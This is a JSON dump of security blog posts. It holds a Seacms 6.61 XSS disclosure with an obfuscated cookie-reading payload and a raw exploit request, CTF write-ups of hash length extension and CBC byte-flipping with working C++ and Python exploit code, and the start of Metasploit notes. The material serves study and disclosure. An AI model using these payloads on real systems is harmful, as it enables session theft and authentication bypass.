[{"title":"Seacms6.61xss漏洞","url":"/2018/07/25/seacms6.61xss/","content":"### Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php  \n#### Affected Version  \nSeacms 6.61  \n#### POC  \n```\n<details/open/ontoggle=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(100)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(117)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(111)+String.fromCharCode(107)+String.fromCharCode(105)+String.fromCharCode(101)+String.fromCharCode(41))>\n```  \n\n```\nPOST /ADMIN/admin_video.php?action=save&acttype=add HTTP/1.1\nHost: cms.jas0nwhy.top\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1354\nCookie: PHPSESSID=8k4mkaq9l3ps7dcrcvafetelt6; HISTORY={video:[{\"name\":\"123\",\"link\":\"http://cms.jas0nwhy.top/detail/?8.html\",\"pic\":\"/pic/nopic.gif\"},{\"name\":\"&lt\\u003bscript&gt\\u003balert(xss)&lt\\u003b/script&gt\\u003b\",\"link\":\"http://cms.jas0nwhy.top/detail/?1.html\",\"pic\":\"/pic/nopic.gif\"},{\"name\":\"&lt\\u003bscript&gt\\u003balert(document.cookie)&lt\\u003b/script&gt\\u003b\",\"link\":\"http://cms.jas0nwhy.top/detail/?5.html\",\"pic\":\"/pic/nopic.gif\"}]}\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n\nv_commend=0&v_name=test&v_enname=test&v_color=&v_type=5&v_state=&v_pic=&v_spic=&v_gpic=&v_actor=&v_director=&v_commend=0&v_note=&v_tags=&select3=&v_publishyear=&select2=&v_lang=&select1=&v_publisharea=&select4=&v_ver=&v_hit=0&v_monthhit=0&v_weekhit=0&v_dayhit=0&v_len=&v_total=&v_nickname=&v_company=&v_tvs=&v_douban=&v_mtime=&v_imdb=&v_score=&v_scorenum=&v_longtxt=&v_money=0&v_psd=123&v_playfrom%5B1%5D=%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD&v_playurl%5B1%5D=test&m_downfrom%5B1%5D=%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E4%B8%80&m_downurl%5B1%5D=test&v_content=%3Ccode%3E%26lt%3Bdetails%2Fopen%2Fontoggle%3Deval%28String.fromCharCode%2897%29%2BString.fromCharCode%28108%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28114%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2840%29%2BString.fromCharCode%28100%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28117%29%2BString.fromCharCode%28109%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28110%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2846%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28107%29%2BString.fromCharCode%28105%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%2841%29%29%26gt%3B%3C%2Fcode%3E&Submit=%E7%A1%AE%E5%AE%9A%E6%8F%90%E4%BA%A4\n```\n\n#### vulnerability trigger point  \n![image](https://github.com/Jas0nwhy/vulnerability/blob/master/seacms1.JPG?raw=true\n)  \n\n\n![image](https://github.com/Jas0nwhy/vulnerability/blob/master/seacms2.JPG?raw=true\n)  \n\n\n![image](https://github.com/Jas0nwhy/vulnerability/blob/master/seacms3.JPG?raw=true)\n\n\n\n![image](https://github.com/Jas0nwhy/vulnerability/blob/master/seacms4.JPG?raw=true)  \n\n\n\n![image](https://github.com/Jas0nwhy/vulnerability/blob/master/seacms5.jpg?raw=true)","tags":["xss"]},{"title":"hash长度扩展攻击","url":"/2018/07/20/hash长度扩展攻击(1)/","content":"### hash长度扩展攻击  \n#### MD5加密算法  \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftiqli9nbjj30rz0hjq4r.jpg)  \n##### 分组\n首先要知道md5的运算都是将明文分割为以512bit（64字节）一组进行运算的，而最后一组不够512bit另做处理  \n##### 补位\n最后一组将含有两部分有效信息，一是明文%512bit的数据，二是记录的原消息总长（固定占有64位，也就是8个字节），那么其中剩下的位置=512-64-明文%512bit的部分由100000...（在16进制中为800000...）补满  \n例：![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftir5g26ywj30io02pmwx.jpg)  \n前面的616263是明文的尾部，800000...是补位的，1800...是明文长度   \n##### 链接变量  \n链接变量最开始是ABCD四个初始序列，共128位  \n\n    A=0x67452301\n    \n    B=0xefcdab89\n    \n    C=0x98badcfe\n    \n    D=0x10325476   \n\n\n将第一组链接变量与第一组明文进行复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就用第一次算的MD5的值进行后面部分的运算算出新的MD5值，以此类推。  \n#### 长度扩展攻击原理   \n加入有这么一个情况，有一个需要MD5加密的字符串C由A和B两部分组成，A是未知的（也可以理解为salt）但是我们知道它的长度和MD5值，B是已知的且可控的，那么\n我们将B的值构造一下，就可以得到字符串C的值。  \n##### 引子：  \n假如A为test（十六进制为0x74657374）  \n那么我们构造B，使A+B等于512位，且形式与需要补位的最后一组一样  \n\n    B=800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000   \n接着在后面添加上B=0x746573748，此时str将大于512位，md5加密时系统会自动补位为1024位，并分为两组\n\n    第一组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000\n\n    第二组=74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000   \n这样程序先计算第一部分，得到ABCD链接变量  \n\n    A=0xcd6b8f09\n    \n    B=0x73d32146\n    \n    C=0x834edeca\n    \n    D=0xf6b42726\n第二部分就用第一部分的ABCD链接变量去运算得到新的ABCD链接变量  \n\n    A=0x226359e5\n    \n    b=0x99df12eb\n    \n    C=0x6853f59e\n    \n    D=0xf5406385  \n最后高低位逆序得到MD5值e5596322eb12df999ef55368856340f5   \n##### 攻击：  \n现在我们知道A长度是4，MD5值高低位逆序得到的ABCD链接变量是\n\n    A=0xcd6b8f09\n    \n    B=0x73d32146\n    \n    C=0x834edeca\n    \n    D=0xf6b42726   \n这时我们构造\n\n    B=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00test  \n\n这时C大于512位，补位为1024位，其实前512位得到的ABCD我们已经知道，那么如果我们把初始链接变量改为前512位得到的ABCD计算一下0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000\n的MD5，发现是e5596322eb12df999ef55368856340f5，这样两个不同的b值得到了一样的MD5值   \n### 实例  \n通过实例更好理解，这是实验吧的让我进去  \n![image](https://screenshotscdn.firefoxusercontent.com/images/0804fc7f-c908-48af-afc1-6ac0ace595c3.png)\n随便输入username和admin抓包  \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1ftiz6v0sn9j30xv07ajsz.jpg)  \n将source值改为1发包得到关键源码  \n\n```\n<?php\n$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";\n$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!\n\n$username = $_POST[\"username\"];\n$password = $_POST[\"password\"];\n\nif (!empty($_COOKIE[\"getmein\"])) {\n    //要求username要等于admin，但是password要不等于admin\n    if (urldecode($username) === \"admin\" && urldecode($password) != \"admin\") {\n        //要求传入的getmein值要等于MD5加密后的salt+username+password\n        if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) {\n            echo \"Congratulations! You are a registered user.\\n\";\n            die (\"The flag is \". $flag);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"You are not an admin! LEAVE.\");\n    }\n}\n//这里规定sample-hash值为MD5加密后的salt+adminadmin\nsetcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));\n\nif (empty($_COOKIE[\"source\"])) {\n    setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));\n}\nelse {\n    if ($_COOKIE[\"source\"] != 0) {\n        echo \"\"; // This source code is outputted here\n    }\n}\n?>\n```\n这道题要求我们post传入的username=admin，password！=admin，又要$COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password)),这里就要用到hash长度扩展攻击  \n现在我们知道了：   \nsalt的长度是15    \nsalt+adminadmin的MD5值是571580b26c65f306376d4f64e53cb5c7  \n那么，我们现在就要开始构造password=\n\n    admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin\n使得拼接后的字符串为\n\n    012345678901234adminadmin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin  \n这里利用password将拼接字符串大于512位，系统将自动补位为1024位，前512位的MD5值就是MD5(salt+admin+admin)(这个我们是已知的，就是sample-hash)，那么我们将sample—hash的值高低位逆序得到的ABCD链接向量换掉初始ABCD链接向量进行MD5运算(也就是直接运算第二组),最终得到的值就是md5($secret . urldecode($username . $password))  \n更换初始链接变量进行MD5运算代码：\n\n```\n#include <cmath>\n#include <cstdio>\n#include <vector>\n#include <string>\n#include <cstring>\n#include <iostream>\n \n \nusing namespace std;\ntypedef unsigned int uint;\ntypedef long long LL;\nconst int MAXN = 1e6 + 5;\nconst int mod = 1e9 + 7;\n \nstruct MD5 {\n \n    typedef void (MD5::*deal_fun)(uint&, uint, uint, uint, uint, uint, uint);//用于定义函数指针数组\n    string init_str;//数据字符串\n    uint init_arr[1000];//最终的数据数组{进行扩充处理后的数据}\n \n \n    const static int MAXN = 1e2;\n \n    static uint s_state[4];//最开始的默认静态渐变变量\n \n    uint state[4];//这个也是默认渐变变量，但是会改变\n \n    static uint rolarray[4][4];//位移数组\n    static uint mN[4][16];//对M数组的处理\n \n    uint curM;//当前处理的直接在整个数据中的位置\n    uint lenZ;//数据的总长{进行扩充处理后的数据总长，这个数是64的倍数}\n    uint offset;//需要从第几组开始处理\n    uint Tarr[64];//当前保存的T数组数据\n    uint Memory[64 + 5];//当前要处理的64个字节数据\n    uint M[16];//将64个字节数据分为16个数\n \n    MD5();\n    MD5(string str, int noffset);\n \n    //数据处理函数\n    inline uint F(uint X, uint Y, uint Z);\n    inline uint G(uint X, uint Y, uint Z);\n    inline uint H(uint X, uint Y, uint Z);\n    inline uint I(uint X, uint Y, uint Z);\n \n    //循环左移函数\n    uint ROL(uint s, uint ws);\n \n    //过程处理函数\n    inline void FF(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac);\n    inline void GG(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac);\n    inline void HH(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac);\n    inline void II(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac);\n \n    //生成T数组单个数据的函数\n    inline uint T(uint i);\n \n    //将总数据中的64个字节移到Memory数组中\n    void data_Init();\n \n    //建立M数组\n    void create_M_arr();\n \n    //移动a,b,c,d，规则在前面介绍了\n    void l_data_change(uint *buf);\n \n    //产生T数组\n    void create_T_arr();\n \n    //得到最终MD5值\n    string get_MD5();\n \n    //过程处理\n    void processing();\n \n};\n \nuint MD5::rolarray[4][4] = {\n    { 7, 12, 17, 22 },\n    { 5, 9, 14, 20 },\n    { 4, 11, 16, 23 },\n    { 6, 10, 15, 21 }\n};\n \nuint MD5::mN[4][16] = {\n    { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 },\n    { 1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12 },\n    { 5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2 },\n    { 0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9 }\n};\n \n/*\n传统渐变变量\n0x67452301,\n0xefcdab89,\n0x98badcfe,\n0x10325476\n这四个东西是可以根据要求更改的，如果取上述几个数则和经常用的MD5算出的结果是一样的\n对了，由于有些数据是静态的，改变之后不会进行需要重新进行复制\n*/\n \nuint MD5::s_state[4] = {\n    0xb2801557,\n    0x06f3656c,\n    0x644f6d37,\n    0xc7b53ce5\n};//已经按小端规则反处理哈希值了\n \n \nMD5::MD5() {}\n \nMD5::MD5(string str, int noffset = 1) {\n    offset = noffset;\n    curM = (noffset - 1) * 64;//从0位置处开始处理\n    init_str = str;//对数据字符串进行处理\n    lenZ = init_str.length();\n    memset(init_arr, 0, sizeof(init_arr));\n \n    for(int i = 0; i < lenZ; i ++) {\n        init_arr[i] = str[i];//最终的数据数组进行赋值\n    }\n    /*\n        将数据扩充到取模64个字节等于56个字节\n        第一个填充0x80，然后就是0x00了\n    */\n    if(lenZ % 64 != 56) init_arr[lenZ ++] = 0x80;\n    while(lenZ % 64 != 56) {\n        init_arr[lenZ ++] = 0x00;\n    }\n \n    /*\n        最后8个字节保存了没扩充钱位数的多少，记住是位数的个数不是字节的个数，同时是按照小端规则\n    */\n    uint lengthbits = init_str.length() * 8;\n    init_arr[lenZ ++] = lengthbits & 0xff;\n    init_arr[lenZ ++] = lengthbits >> 8 & 0xff;\n    init_arr[lenZ ++] = lengthbits >> 16 & 0xff;\n    init_arr[lenZ ++] = lengthbits >> 24 & 0xff;\n \n    //因为uint最多32位所以我们只要考虑四个字节就可以了，虽然实际上要考虑64位，嘿\n    lenZ += 4;//这步我没读懂！！！\n \n \n    for(int i = 0;i < 4;i ++){\n        state[i] = s_state[i];//将最开始的默认静态渐变变量赋值给静态渐变变量\n    }\n \n}\n \ninline uint MD5::F(uint X, uint Y, uint Z) {\n    return (X & Y) | ((~X) & Z);\n}\ninline uint MD5::G(uint X, uint Y, uint Z) {\n    return (X & Z) | (Y & (~Z));\n}\ninline uint MD5::H(uint X, uint Y, uint Z) {\n    return X ^ Y ^ Z;\n}\ninline uint MD5::I(uint X, uint Y, uint Z) {\n    return Y ^ (X | (~Z));\n}\nuint MD5::ROL(uint s, uint ws) {\n    return (s << ws) | (s >> (32 - ws));\n}\n \n \ninline void MD5::FF(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac) {\n    a = ROL(a + F(b, c, d) + x + ac, s) + b;\n    //printf(\"ff\\n\");\n}\n \ninline void MD5::GG(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac) {\n    a = ROL(a + G(b, c, d) + x + ac, s) + b;\n    //printf(\"gg\\n\");\n}\n \ninline void MD5::HH(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac) {\n    a = ROL(a + H(b, c, d) + x + ac, s) + b;\n    //printf(\"hh\\n\");\n}\n \ninline void MD5::II(uint &a, uint b, uint c, uint d, uint x, uint s, uint ac) {\n    a = ROL(a + I(b, c, d) + x + ac, s) + b;\n    //printf(\"ii\\n\");\n}\n \n//这里前面讲了\ninline uint MD5::T(uint i) {\n    return (uint)((0xffffffff + 1LL) * abs(sin(i)));\n}\n \n//取64个字节放在Memory数组中\nvoid MD5::data_Init() {\n    uint tmp = 0;\n    for(int i = 0; i < 64; i ++) {\n        Memory[i] = init_arr[curM + i];\n    }\n    curM += 64;//变化位置\n}\n \n \nvoid MD5::create_T_arr() {\n    for(int i = 1; i <= 64; i ++) {\n        Tarr[i - 1] = T(i);\n    }\n}\n \n/*\n这里使用了小端将数据存在M数组中，可以稍微思考一下\n*/\nvoid MD5::create_M_arr() {\n    uint tmp = 0;\n    int cnt = 0;\n    for(int i = 0; i < 64; i += 4) {\n        tmp = 0;\n        for(int j = 3; j >= 0; j --) {\n            tmp |= Memory[i + j];\n            if(j == 0) break;\n            tmp <<= 8;\n        }\n        M[cnt ++] = tmp;\n    }\n}\n \n//移动a,b,c,d，最后一个移到第一个\nvoid MD5::l_data_change(uint *buf) {\n    uint buftmp[4] = {buf[3], buf[0], buf[1], buf[2]};\n    for(int i = 0; i < 4; i ++) {\n        buf[i] = buftmp[i];\n    }\n}\n \nvoid MD5::processing() {\n    uint statetmp[4];\n    for(int i = 0; i < 4; i ++) {\n        statetmp[i] = state[i];\n    }\n    /*\n        这里的处理只是为了更方便的循环\n    */\n    uint * a = &statetmp[0];\n    uint * b = &statetmp[1];\n    uint * c = &statetmp[2];\n    uint * d = &statetmp[3];\n \n    /*\n        产生M数组和T数组\n    */\n    create_M_arr();\n    create_T_arr();\n \n    /*\n        建立函数指针数组\n        循环处理\n    */\n \n    deal_fun d_fun[4] = {\n        &MD5::FF, &MD5::GG, &MD5::HH, &MD5::II\n    };\n \n    for(int i = 0; i < 4; i ++) {\n        for(int j = 0; j < 16; j ++) {\n            (this ->* d_fun[i])(*a, *b, *c, *d, M[mN[i][j]], rolarray[i][j % 4], Tarr[i * 16 + j]);\n            l_data_change(statetmp);//交换a,b,c,d\n        }\n    }\n \n \n    for(int i = 0; i < 4; i ++) {\n        state[i] += statetmp[i];\n    }\n}\n \nstring MD5::get_MD5() {\n    string result;\n    char tmp[15];\n    for(int i = 0;i < (lenZ - (offset - 1) * 64) / 64;i ++){\n        data_Init();\n        processing();\n    }\n \n    /*\n        最终显示也是用小端\n    */\n \n    for(int i = 0; i < 4; i ++) {\n        sprintf(tmp, \"%02x\", state[i] & 0xff);\n        result += tmp;\n        sprintf(tmp, \"%02x\", state[i] >> 8 & 0xff);\n        result += tmp;\n        sprintf(tmp, \"%02x\", state[i] >> 16 & 0xff);\n        result += tmp;\n        sprintf(tmp, \"%02x\", state[i] >> 24 & 0xff);\n        result += tmp;\n    }\n    return result;\n}\n \nint main() {\n    MD5 md1(\"123456789123456adminadmin123456789123456789123456789123456789123admin\",2);\n    cout << md1.get_MD5() << endl;\n    return 0;\n}\n```\n将运行代码得到的hash值利用getmein写入cookie，将username=admin，passsword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin  \n![image](http://wx3.sinaimg.cn/mw690/0060lm7Tly1ftj00nu1bxj30xp097ach.jpg)  \nflag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}\n\n参考文章：  \n[MD5的Hash长度扩展攻击](https://www.cnblogs.com/p00mj/p/6288337.html)  \n[科普哈希长度扩展攻击](http://www.freebuf.com/articles/web/31756.html)\n\n\n\n\n\n","tags":["密码学"]},{"title":"CBC字节翻转攻击","url":"/2018/06/22/CBC字节翻转攻击/","content":"#### CBC字节翻转攻击   \n##### 简介\nCBC加密是AES加密的一种模式，中文名叫密码分组链接模式（Cipher Block Chaining (CBC)），这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。  \n看下图：  \nIV：随机生成的初始向量   \nPlaintxt：明文数据  \nCiphertext：密文数据  \nKey：分组加密使用的密钥   \n##### 加密过程\n![image](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip1.png)   \n \n首先将我们需要将需要加密的明文按照十六个字节为一组分组，最后一组不满十六字节用特殊字符填补   \n接着系统产生一个十六字节的随机字符串作为初始向量，该向量与第一组明文进行异或操作，再与key进行CBC加密得到第一组密文  \n第一组密文再与下一组明文进行异或操作CBC加密得到第二组密文   \n以此类推......  \n将得到的密文组按顺序拼接到一起就是所得到的密文  \n##### 解密过程\n![image](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/082113_1459_CBCByteFlip2.png)  \n首先将密文按十六进制分组  \n第一组密文与key进行CBC解密，再将解密的数据与初始向量异或得到第一组明文  \n接着第一组密文再与下一组CBC解密得到的数据进行异或操作得到第二组明文  \n以此类推......   \n最后拼接得到明文   \n##### 异或操作  \nCBC字节翻转的关键点就在异或上，所以首先我们要明白异或是什么。    \n![image](https://screenshotscdn.firefoxusercontent.com/images/e68ed912-038b-43ad-8c51-7dde8359fe7d.png)  \n当我们的一个值C是由A和B异或得到  \nC = A XOR B  \n那么  \nA XOR B XOR C很明显是=0的  \n当我们知道B和C之后，想要得到A的值也很容易  \nA = B XOR C  \n因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。  \n##### 攻击过程   \n![image](http://wx4.sinaimg.cn/mw690/0060lm7Tly1fspt6lq2ufj30w90awdh5.jpg)  \n攻击针对的是解密过程   \n第一步：修改  \n\n由图可知，你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。   \n\n所以我们要找到要修改的明文中的那一个字节C，我，上一组密文对应字节为A，本组密文对应字节为B，我们知道了A xor B = C，我们现在现在要将C改变为c，那么知道A XOR B XOR C = 0，则A XOR B XOR C xor c= c。  \n\n这里我们知道B是解密后的数据未知我们不好修改，所以我们可以将A修改a=A xor C xor c ，这样我们就将C替换成了c。  \n\n第二步：修复  \n\n上一步我们将第二组明文修改为了我们想要得到的数据，但是，与此同时，我们也将第一组密文给修改了，这就会导致第一组明文数据被修改，那么我们不能去修改第一组密文，又要使第一组明文数据正确，我们只有利用异或对初始向量下手。  \n\n若原iv为O，新iv为N，错误的第一组明文M = O xor 第一组密文，我们要想得到正确的第一组明文m，那么就去改变N = O xor M xor m，这样就利用异或得到了正确的明文。  \n##### 看个例子  \n这是iscc的一道题Only admin can see flag  \n![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1fspuq0rb5qj30ky0a83z2.jpg)   \n查看源码发现一个TXT文件，打开得到PHP代码   \n\n```\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\n //设置随机初始向量\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\n\n//设置cookie的流程调用的函数，返回一个随机的iv和使用该iv加密的post提交的username和password的结果——cipher\nfunction login($info){\n    $iv = get_random_iv();\n    //序列化传入数组\n    #a:2:{s:8:\"username\";s:5:\"Admin\";s:8:\"password\";s:4:\"test\";}\n    #第一组明文：a:2:{s:8:\"userna\n    #第二组明文：me\";s:5:\"Admin\";\n    #第三组明文：s:8:\"password\";s\n    #第四组明文：:4:\"test\";}\n    $plain = serialize($info);\n    //cbc加密\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\n\n//检查函数，这里是对cookie中cipher和iv进行CBC翻转的利用点\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        //进行CBC模式的AES解密\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            //对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\n \n //根据session中username参数，控制显示结果\n//如果没有设置参数，进入判断cookie路径\nfunction show_homepage(){\n    //session要为admin\n    if ($_SESSION[\"username\"]==='admin'){\n        echo $flag;\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\n //入口\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    //post传参不能为admin\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n```\n我已经在其中做出详细的注释  \n首先从入口开始验证post是否传参username和password，这里要求传入的用户名不能为admin。  \n\n```\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    //post传参不能为admin\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n```\n\n接着对传入参数序列化，接着对起进行一次CBC加密，得到了COOKIE值iv和cipher，以及session值username，对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值，但是这里又要传入的username参数为admin。\n\n```\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        //进行CBC模式的AES解密\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            //对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\n```\n所以我们利用CBC翻转字节，传入Admin绕过过滤，再在加密过程中将A翻转为a，通过验证。  \n修改代码如下：    \n\n```\nimport urllib,base64,requests,re\n\nurl = \"http://*.*.*.*/index.php\"\ndatas = {\n    \"username\" : \"Admin\",\n    \"password\" : \"test\"\n}\n#第一组明文：a:2:{s:8:\"userna\n#第二组明文：me\";s:5:\"admin\";\n#第三组明文：s:8:\"password\";s\n#第四组明文：:4:\"test\";}\n#修改过程\nr = requests.post(url,data=datas)\ncipher = r.cookies.get(\"cipher\")#获取初始密文\ncipher = base64.b64decode(urllib.unquote(cipher))\noffset = 9\nnew_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(\"A\")^ord(\"a\")) + cipher[offset+1:]#字节翻转\nnew_cookies = requests.utils.dict_from_cookiejar(r.cookies)\nnew_cookies[\"cipher\"] = urllib.quote_plus(base64.b64encode(new_cipher))\n#修复过程\nr2 = requests.get(url,cookies=new_cookies)\n#获得损坏的第一段明文\nplain = base64.b64decode(re.findall(\"decode('(.*)')\",r2.text)[0])\niv = base64.b64decode(urllib.unquote(new_cookies[\"iv\"]))\nold = plain[:len(iv)]\nnew = 'a:2:{s:8:\"userna'\nnew_iv = \"\".join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])\nnew_cookies[\"iv\"] = urllib.quote_plus(base64.b64encode(new_iv))\n\nr3 = requests.get(url,cookies=new_cookies)\nprint(r3.text)\n```\n最后将修改的iv和cipher设为cookies得到flag   \n\nCBC翻转字节攻击属于密码学的题目，关键是理解加密解密过程和异或操作，后面还遇到了翻转攻击与SQL注入的结合题型，值得继续了解。。。  \n\n","tags":["ctf"]},{"title":"Metasploit 整理笔记","url":"/2018/06/12/Metasploit 整理笔记(更新中)/","content":"#### 一．名词解释  \n##### exploit  \n测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的有内存溢出，网站程序漏洞利用，配置错误exploit。  \n##### payload  \n我们想让被攻击系统执行的程序，如reverse shell 可以从目标机器与测试者之间建立一\n个反响连接，bind shell     绑定一个执行命令的通道至测试者的机器。payload 也可以是只能在目标机器上执行有限命令的程序 。  \n##### shellcode    \n是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可执行命令的shell。\n##### module\nMSF 的模块，由一系列代码组成。    \n##### listener    \n等待来自被攻击机器的incoming连接的监听在测试者机器上的程序  \n\n#### 二. 编码器  \nmsfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai  \n\n#### 三．信息刺探与收集  \n##### 